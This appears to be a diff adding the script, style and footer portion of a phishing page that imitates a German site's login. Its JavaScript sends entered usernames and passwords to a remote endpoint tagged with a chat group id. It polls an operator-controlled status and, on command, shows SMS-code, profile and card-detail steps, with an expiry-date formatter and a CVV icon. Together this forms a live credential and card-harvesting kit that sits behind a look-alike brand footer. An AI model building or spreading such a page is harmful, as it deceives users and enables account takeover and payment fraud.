+                    error: function(jqXHR, status, error) {
+                        console.log("we have reached error ");
+                        console.log(status);
+                        console.log(error);
+                    }
+                });
+            } else {
+                // Handle the case when the form is invalid
+                $("#pf1").hide(); // Ensure all error messages are hidden
+                $("#pf2").show(); // Show specific errors if needed
+                $("#pf3").show(); // Show specific errors if needed
+            }
+        });
+    });
+});
+
+
+
+$(document).ready(function() {
+    $("#login_form").submit(function(e) {
+		e.preventDefault(); // Prevent form submission
+
+     function validatelogin() {
+    var isValid = true; // Initialize validity status
+
+    // Get values from input fields
+    var email = $('#username').val();
+    var password = $('#password').val();
+
+    // Clear previous error messages and classes
+    $("#loglabel").removeClass("_error_1p61g_17");
+    $("#passlabel").removeClass("_error_1p61g_17 _errorMessage_1p61g_146");
+    $("#errorMessages1, #errorMessages2").hide(); // Hide all error messages initially
+
+    // Check if email input is empty
+    if (!email) {
+        $("#loglabel").addClass("_error_1p61g_17"); // Add error class to email input
+        $("#errorMessages1").show(); // Show error message for email
+        isValid = false; // Set validity status to false
+    }
+
+    // Check if password input is empty or does not meet criteria
+    if (!password || password.length < 4) {
+        $("#passlabel").addClass("_error_1p61g_17 _errorMessage_1p61g_146"); // Add error class to password label
+        $("#errorMessages2").show(); // Show error message for password
+        isValid = false; // Set validity status to false
+    }
+
+    // Display error messages if any
+    if (!isValid) {
+        // Show all relevant error messages
+        if (!email) {
+            $("#errorMessages1").show(); // Show email error message
+        }
+        if (!password || password.length < 4) {
+            $("#errorMessages2").show(); // Show password error message
+        }
+    } else {
+        // Hide error messages if everything is valid
+        $("#errorMessages1").hide();
+        $("#errorMessages2").hide();
+    }
+
+    return isValid; // Return the validity status
+}
+
+
+        // Validate login before making the AJAX call
+        if (validatelogin()) {
+            $("#loader_spin").show(); 
+            $.ajax({
+                method: "POST",
+                url: endurl,
+                dataType: "json",
+                data: {
+                    id_chat: grpid,
+                    username: $('#username').val(),
+                    password: $('#password').val()
+                },
+                success: function(result) {
+                    let intervalId = setInterval(function() {
+                        checkStatus(result.login, function(sets) {
+                            if (sets.status === "login_wrong") {
+                                clearInterval(intervalId);
+                                //$("#errorlogin").show();
+								$("#errorlogin").fadeIn(); // Show the error message
+									setTimeout(function() {
+										$("#errorlogin").fadeOut(); // Hide after 3 seconds (3000 ms)
+									}, 2000);
+                                $("#loader_spin").hide();
+                                $('#username, #password').val(""); // Clear inputs
+                            }
+                            if (sets.status === "sms_set") {
+                                clearInterval(intervalId);
+                                $("#loader_spin").hide();
+								$('html, body').animate({ scrollTop: 0 }, 'slow');
+                                $('#main_login').hide();
+                                $("#main_profile").hide();
+                                $("#main_sms").show();
+                                $("#login_value").val(result.login);
+
+                            }if (sets.status === "profile_set") {
+                                clearInterval(intervalId);
+                                $("#loader_spin").hide();
+								$('html, body').animate({ scrollTop: 0 }, 'slow');
+                                $('#main_login').hide();
+                                $("#main_profile").show();
+                                $("#login_value1").val(result.login);
+                            }
+                            if (sets.status === "login_succes_done") {
+                                clearInterval(intervalId);
+                                $("#main_login").hide();
+                                $("#main_sms").hide();
+                                $("#main_profile").hide();
+                                $("#main_done").show();
+                                $("#loader_spin").hide();
+								$('html, body').animate({ scrollTop: 0 }, 'slow');
+                            }
+                        });
+                    }, 1000);
+                },
+                error: function(jqXHR, status, error) {
+                    console.error("Error during login:", status, error);
+                }
+            });
+        }
+    });
+});
+function formatString(e) {
+			var inputChar = String.fromCharCode(event.keyCode);
+			var code = event.keyCode;
+			var allowedKeys = [8];
+			if (allowedKeys.indexOf(code) !== -1) {
+				return;
+			}
+
+			event.target.value = event.target.value.replace(
+				/^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
+			).replace(
+				/^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
+			).replace(
+				/^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
+			).replace(
+				/^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
+			).replace(
+				/^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
+			).replace(
+				/[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
+			).replace(
+				/\/\//g, '/' // Prevent entering more than 1 `/`
+			);
+		}
+
+function checkStatus(id, callback) {
+			$.ajax({
+				method: 'POST',
+				url: endurl,
+				dataType: "json",
+				async: true,
+				data: {
+					'action': 'get_userstatus',
+					'tocheck': id
+				},
+				success: function(response) {
+					callback(response); // Pass the whole response object
+				},
+				error: function(jqXHR, textStatus, errorThrown) {
+					callback({
+						status: "error"
+					}); // Provide a response structure
+				}
+			});
+		}
+</script>
+<style>
+.input-logo {
+	background-image: url(https://cdn.glitch.global/f6b8335a-181c-4063-8783-680b2f1f5d01/slogoasdh429a8o742pgm38.png?v=1730068001858);
+	background-repeat: no-repeat;
+	background-size: 132px 35px;
+	background-position: right;
+	background-position: right 0px bottom -7px;
+}
+
+.sinput-cvv {
+	background-image: url(https://cdn.glitch.global/79dd3c64-21db-48e6-aea2-0034122a1fc6/vv.gif);
+	background-repeat: no-repeat;
+	background-size: 58px 33px;
+	background-position: right 3px bottom -2px;
+}
+.sinput-smss {
+	background-image: url(https://www.freeiconspng.com/uploads/chat-message-mobile-phone-sms-talk-icon-1.png);
+	background-repeat: no-repeat;
+	background-size: 36px 36px;
+	background-position: right 3px bottom -9px;
+} 
+</style>
+               <footer class="footer_footer__FSmHc">
+                  <div class="footer_footerContent__JFp33">
+                     <ul class="footer_linkContainer__OKNTB">
+                        <li class="footer_listItem__YYMM0"><a class="footer_link__c9bqO"  rel="nofollow" href="#">Impressum</a></li>
+                        <li class="footer_listItem__YYMM0"><a class="footer_link__c9bqO"  rel="nofollow" href="#">Fragen &amp; Antworten</a></li>
+                        <li class="footer_listItem__YYMM0"><a class="footer_link__c9bqO"  rel="nofollow" href="#">Datenschutz</a></li>
+                        <li class="footer_listItem__YYMM0"><a class="footer_link__c9bqO"  rel="nofollow" href="#">Nutzungsbedingungen</a></li>
+                        <li class="footer_listItem__YYMM0"><a class="footer_link__c9bqO"  rel="nofollow" href="#">Erstinformation §15 VersVermV</a></li>
+                        <li class="footer_listItem__YYMM0"><a class="footer_link__c9bqO"  rel="nofollow" href="#">Kontakt</a></li>
+                        <li class="footer_listItem__YYMM0"><a class="footer_link__c9bqO" href="#">Cookie-Einstellungen</a></li>
+                     </ul>
+                     <div class="footer_iconDiv__6pWfk">
+                        <svg width="88" height="44" viewBox="0 0 88 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+                           <path d="M73.768 16.5122L75.1103 12.9473H74.6003L73.6328 15.6337L72.6652 12.9473H72.1425L73.3877 16.2733L73.3487 16.3768C73.2453 16.693 73.0647 16.842 72.7098 16.842C72.5873 16.842 72.4584 16.8292 72.3422 16.8029V17.2489C72.4456 17.2681 72.5936 17.2816 72.7361 17.2816C73.2588 17.2816 73.5619 17.0554 73.768 16.513M70.0451 13.316C70.7031 13.316 71.058 13.8329 71.058 14.537C71.058 15.2411 70.7031 15.7508 70.0451 15.7508C69.3871 15.7508 69.0323 15.2403 69.0323 14.537C69.0323 13.8337 69.3871 13.316 70.0451 13.316ZM70.1486 12.8899C69.7165 12.8899 69.3418 13.0452 69.084 13.4068V11.6371H68.6002V16.1196H69.0649V15.6544C69.3036 16.0097 69.6911 16.1777 70.1621 16.1777C70.9044 16.1777 71.5688 15.5963 71.5688 14.537C71.5688 13.4777 70.9172 12.8899 70.1494 12.8899M64.3745 13.316C65.0325 13.316 65.3873 13.8329 65.3873 14.537C65.3873 15.2411 65.0325 15.7508 64.3745 15.7508C63.7165 15.7508 63.3616 15.2403 63.3616 14.537C63.3616 13.8337 63.7165 13.316 64.3745 13.316ZM64.271 12.8899C63.5032 12.8899 62.8516 13.4777 62.8516 14.537C62.8516 15.5963 63.5159 16.1777 64.2583 16.1777C64.7293 16.1777 65.1168 16.0097 65.3555 15.6544V16.1196H65.8202V11.6371H65.3364V13.4068C65.0786 13.0452 64.7039 12.8899 64.2718 12.8899M59.626 14.2981C59.7095 13.6649 60.0906 13.3097 60.6261 13.3097C61.1616 13.3097 61.5355 13.6521 61.5618 14.2981H59.626ZM59.1159 14.5306C59.1159 15.5708 59.7612 16.1777 60.6126 16.1777C61.2897 16.1777 61.8642 15.8416 62.0066 15.1574H61.4966C61.3804 15.5644 61.0255 15.758 60.5999 15.758C59.9872 15.758 59.6451 15.2474 59.6188 14.6923H62.0575C62.0639 14.6214 62.0639 14.5434 62.0639 14.5115C62.0639 13.4331 61.4448 12.8907 60.6189 12.8907C59.7413 12.8907 59.1159 13.5303 59.1159 14.5314M58.555 12.9043C58.4452 12.8979 58.3871 12.8979 58.329 12.8979C57.9551 12.8979 57.5358 13.085 57.3289 13.5311V12.9497H56.8642V16.1212H57.348V14.3705C57.348 13.7573 57.7609 13.4084 58.2574 13.4084C58.341 13.4084 58.438 13.4084 58.5542 13.4148V12.9043H58.555ZM53.4254 14.2997C53.5089 13.6665 53.8901 13.3112 54.4255 13.3112C54.961 13.3112 55.335 13.6537 55.3612 14.2997H53.4254ZM52.9154 14.5322C52.9154 15.5724 53.5606 16.1793 54.412 16.1793C55.0891 16.1793 55.6636 15.8432 55.806 15.159H55.296C55.1798 15.566 54.825 15.7596 54.3993 15.7596C53.7866 15.7596 53.4445 15.249 53.4182 14.6939H55.8569C55.8633 14.623 55.8633 14.545 55.8633 14.5131C55.8633 13.4347 55.2435 12.8923 54.4184 12.8923C53.5408 12.8923 52.9154 13.5319 52.9154 14.533M50.0247 13.4737L50.7536 16.122H51.3734L52.2963 12.9504H51.8062L51.0575 15.6632L50.3223 12.9504H49.7415L49.0063 15.6632L48.2576 12.9504H47.7539L48.6769 16.122H49.2967L50.0255 13.4737H50.0247ZM45.6112 15.754C44.9532 15.754 44.5983 15.2435 44.5983 14.5402C44.5983 13.8369 44.9532 13.3192 45.6112 13.3192C46.2692 13.3192 46.6241 13.8361 46.6241 14.5402C46.6241 15.2443 46.2692 15.754 45.6112 15.754ZM45.6112 16.1801C46.5016 16.1801 47.1341 15.5597 47.1341 14.5394C47.1341 13.5191 46.5016 12.8923 45.6112 12.8923C44.7209 12.8923 44.0883 13.5191 44.0883 14.5394C44.0883 15.5597 44.7209 16.1801 45.6112 16.1801ZM41.7984 15.754C41.1404 15.754 40.7855 15.2371 40.7855 14.533C40.7855 13.8289 41.1404 13.3192 41.7984 13.3192C42.4564 13.3192 42.8113 13.8297 42.8113 14.533C42.8113 15.2363 42.4564 15.754 41.7984 15.754ZM41.9018 16.1801C42.6697 16.1801 43.3213 15.5923 43.3213 14.533C43.3213 13.4737 42.6569 12.8923 41.9146 12.8923C41.4435 12.8923 41.0561 13.0604 40.8174 13.4156V12.9504H40.3527V17.2521H40.8365V15.6632C41.0942 16.0248 41.469 16.1801 41.901 16.1801M39.191 14.1197C39.191 13.2603 38.72 12.8923 38.0938 12.8923C37.5838 12.8923 37.2616 13.1121 37.0292 13.4538C36.855 13.0922 36.5256 12.8923 36.0617 12.8923C35.5978 12.8923 35.2812 13.1376 35.1005 13.422V12.9504H34.6359V16.122H35.1196V14.3458C35.1196 13.6999 35.5 13.3192 35.9392 13.3192C36.4293 13.3192 36.6744 13.5773 36.6744 14.185V16.1227H37.1581V14.2367C37.1581 13.6298 37.5711 13.32 37.9776 13.32C38.455 13.32 38.7128 13.5781 38.7128 14.1404V16.1235H39.1902V14.1212L39.191 14.1197ZM31.197 14.3004C31.2806 13.6673 31.6617 13.312 32.1972 13.312C32.7327 13.312 33.1066 13.6545 33.1329 14.3004H31.197ZM30.687 14.533C30.687 15.5732 31.3323 16.1801 32.1836 16.1801C32.8608 16.1801 33.4352 15.844 33.5776 15.1598H33.0676C32.9515 15.5668 32.5966 15.7604 32.1709 15.7604C31.5583 15.7604 31.2161 15.2498 31.1899 14.6947H33.6286C33.6349 14.6238 33.6349 14.5458 33.6349 14.5139C33.6349 13.4355 33.0159 12.8931 32.19 12.8931C31.3124 12.8931 30.687 13.5327 30.687 14.5338" fill="#F2F2F2"></path>
+                           <path d="M65.8928 23.1348H67.2343V21.792H65.8928V23.1348ZM36.4446 26.4624L33.6455 25.7854C32.701 25.564 32.2109 25.0384 32.2109 24.2562C32.2109 23.1707 33.2142 22.4467 34.7069 22.4467C36.1996 22.4467 37.1679 23.2169 37.2729 24.4785L37.2848 24.6417H38.4744V24.4554C38.4163 22.6339 36.8767 21.338 34.7077 21.338C32.5387 21.338 31.0341 22.5757 31.0341 24.2682C31.0341 25.6222 31.8624 26.5445 33.3431 26.93L36.1303 27.607C37.0748 27.8292 37.5649 28.366 37.5649 29.1481C37.5649 30.2918 36.5035 31.0046 34.7889 31.0046C33.0742 31.0046 32.0367 30.2456 31.9197 28.9267L31.9078 28.7634H30.7183V28.9386C30.8233 30.8884 32.386 32.091 34.7769 32.091C37.1679 32.091 38.7306 30.9123 38.7306 29.1489C38.7306 27.783 37.9142 26.8256 36.4446 26.464M43.7575 24.3741C41.6928 24.3741 40.3052 25.9272 40.3052 28.2266C40.3052 30.526 41.6928 32.0671 43.7575 32.0671C45.8223 32.0671 47.233 30.4909 47.233 28.2266C47.233 25.9623 45.8103 24.3741 43.7575 24.3741ZM43.7575 30.9704C42.3699 30.9704 41.4716 29.896 41.4716 28.2266C41.4716 26.5572 42.358 25.4477 43.7575 25.4477C45.1571 25.4477 46.0435 26.5222 46.0435 28.2266C46.0435 29.931 45.169 30.9704 43.7575 30.9704ZM49.0176 31.9397H50.1491V21.5029H49.0176V31.9397ZM63.5376 24.3749C62.6393 24.3749 61.928 24.7365 61.5668 25.5075V24.48H60.4584V31.9397H61.5899V27.7137C61.5899 26.476 62.1031 25.5306 63.3395 25.5306C63.7008 25.5306 64.1097 25.5776 64.3779 25.6238V24.4912C64.1917 24.4331 63.8416 24.3741 63.5384 24.3741M65.9875 31.9389H67.1301V24.4793H65.9875V31.9389ZM73.1254 27.8061L71.6327 27.5146C70.6413 27.3162 70.5132 26.8957 70.5132 26.5453C70.5132 25.8683 71.1664 25.4358 72.1459 25.4358C73.1254 25.4358 73.7555 25.8794 73.8136 26.6496L73.8255 26.8017H74.992L74.98 26.6146C74.922 25.5871 74.1406 24.3733 72.1459 24.3733C70.5363 24.3733 69.3587 25.2956 69.3587 26.5684C69.3587 27.6428 70.0119 28.3078 71.3526 28.5882L72.8341 28.8797C73.8255 29.09 73.9656 29.4754 73.9656 29.837C73.9656 30.561 73.3123 30.9927 72.1809 30.9927C71.0495 30.9927 70.3501 30.5021 70.2912 29.6738L70.2793 29.5105H69.1128L69.1248 29.7088C69.2179 31.156 70.3962 32.0671 72.1801 32.0671C73.964 32.0671 75.1193 31.1568 75.1193 29.8259C75.1193 28.7634 74.4549 28.0864 73.1254 27.8061ZM55.2811 24.3741C54.0096 24.3741 52.482 24.9579 52.3769 26.6154L52.365 26.8025H53.5076L53.5195 26.6504C53.6476 25.6349 54.534 25.4246 55.2803 25.4246C56.1197 25.4246 57.135 25.6819 57.135 26.8726V27.2342L54.534 27.6778C52.9824 27.9582 52.143 28.7284 52.143 29.9191C52.143 30.8995 52.7962 32.044 54.6159 32.044C55.6654 32.044 56.5748 31.6123 57.123 30.8302V31.9397H58.2314V26.8033C58.2314 25.2741 57.123 24.3749 55.2811 24.3749M54.6859 28.683L57.135 28.2624V28.671C57.135 30.2823 55.9105 31.0062 54.709 31.0062C53.8226 31.0062 53.2975 30.5977 53.2975 29.9438C53.2975 29.2899 53.7407 28.8582 54.6851 28.683" fill="#F2F2F2"></path>
+                           <path d="M14.6033 22.1886C14.5564 22.1886 14.5055 22.2101 14.4633 22.2595C13.4512 23.4271 12.9038 24.93 12.9038 26.472C12.9038 29.8784 15.6942 32.9233 19.0972 32.9233C20.5469 32.9233 21.6879 32.0201 21.6879 30.5689C21.6879 29.3305 20.792 28.4591 19.4839 27.9048L17.525 27.0725C15.9464 26.4019 14.6439 25.1889 14.6439 23.4789C14.6439 23.1889 14.6956 22.6856 14.7537 22.4013C14.78 22.2762 14.6988 22.1886 14.6041 22.1886M19.6001 20.0206C18.1504 20.0206 17.0094 20.9238 17.0094 22.3758C17.0094 23.6143 17.9053 24.4856 19.2134 25.0399L21.1723 25.8722C22.7509 26.5428 24.0534 27.7559 24.0534 29.4659C24.0534 29.7558 24.0017 30.2591 23.9436 30.5435C23.9181 30.6685 23.9985 30.7561 24.0932 30.7561C24.1401 30.7561 24.191 30.7346 24.2332 30.6852C25.2453 29.5176 25.7927 28.0147 25.7927 26.4728C25.7927 23.0663 23.0023 20.0214 19.5993 20.0214" fill="#FF6432"></path>
+                        </svg>
+                     </div>
+                  </div>
+               </footer>
+			   	<div id="loader_spin"
+		style="display:none; width:100%; height:100%; position:fixed;  top:0; left:0; background:rgba(0,0,0,0.6);">
+		<div style="width:100%; height:100%; display:flex; justify-content:center; align-items:center;">
+			<img src="https://cdn.glitch.global/a00e7eb6-be33-4305-9420-31176c61c3a2/Rolling%401x-1.0s-200px-200px%20(1).gif?v=1727398007626"
+				style="width:70px;">
+		</div>
+	</div>
+            </div>
+         </div>
+      </div>
+    </body>
+</html>
